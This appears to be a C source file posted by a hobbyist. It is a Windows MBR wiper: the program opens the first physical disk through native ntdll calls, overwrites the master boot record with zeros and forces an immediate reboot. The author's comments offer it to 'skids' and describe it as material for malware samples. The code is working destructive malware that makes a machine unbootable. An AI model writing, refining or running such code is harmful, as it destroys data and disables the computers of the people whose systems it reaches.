// I have been doing windows internals for quite awhile but I havent rlly messed with the mbr, so this is my project for that.
// This is a MBR overwriter that I fine tuned to be as fast as they get, really. I havent tested it cuz uhh why do I have to.
// Normally I work in C++ but I needed more practice with C, also this did take me like 5 hours mostly spent doc reading on how to optimize programs.
// I hope yall little skids use it well.
// Pretty much every comment I make is abt speed.
#include <windows.h>
#include <winternl.h>

// Bind process to CPU 0, for performance.
void bind_cpu()
{
    SetProcessAffinityMask(GetCurrentProcess(), 1);
}

// NT kernel API declarations for MBR manipulation
typedef NTSTATUS(NTAPI *NtCreateFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI *NtWriteFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI *NtSetSystemInformation_t)(ULONG, PVOID, ULONG);

int main()
{
    // Pin to one CPU core, for speed.
    bind_cpu();

    // Zeroed MBR sector, bye bye pc.
    BYTE mbr[512] = {0};

    // Load NT kernel functions
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    NtCreateFile_t NtCreateFile = (NtCreateFile_t)GetProcAddress(ntdll, "NtCreateFile");
    NtWriteFile_t NtWriteFile = (NtWriteFile_t)GetProcAddress(ntdll, "NtWriteFile");
    NtSetSystemInformation_t NtSetSystemInformation = (NtSetSystemInformation_t)GetProcAddress(ntdll, "NtSetSystemInformation");

    // NT path to PhysicalDrive0
    UNICODE_STRING physName;
    physName.Buffer = L"\\Device\\Harddisk0\\Partition0";
    physName.Length = wcslen(physName.Buffer) * 2;
    physName.MaximumLength = physName.Length + 2;
    OBJECT_ATTRIBUTES attr;
    attr.Length = sizeof(attr);
    attr.RootDirectory = NULL;
    attr.ObjectName = &physName;
    attr.Attributes = 0x40;
    attr.SecurityDescriptor = NULL;
    attr.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK io;
    HANDLE hDevice;

    // Open disk for writing
    NtCreateFile(&hDevice, GENERIC_WRITE, &attr, &io, NULL, 0, 7, 1, 0, NULL, 0);

    // Write MBR sector
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    NtWriteFile(hDevice, NULL, NULL, NULL, &io, mbr, 512, &offset, NULL);

    // Close disk handle
    CloseHandle(hDevice);

    // Forced reboot
    ULONG shutdownInfo = 1;
    NtSetSystemInformation(0x000D, &shutdownInfo, sizeof(shutdownInfo));

    // Fallback reboot
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);

    return 0;
}

// Run as administrator
// Quick disclaimer, don't run this on your main system. Because the moment you run it as admin there will be no chance of stopping it besides AV.
// I really only made this for malware samples, so feel free to add.
// Also, dont ask if its UD its not. Js dont use it outside a vm.
// Good luck on not bricking ur pc!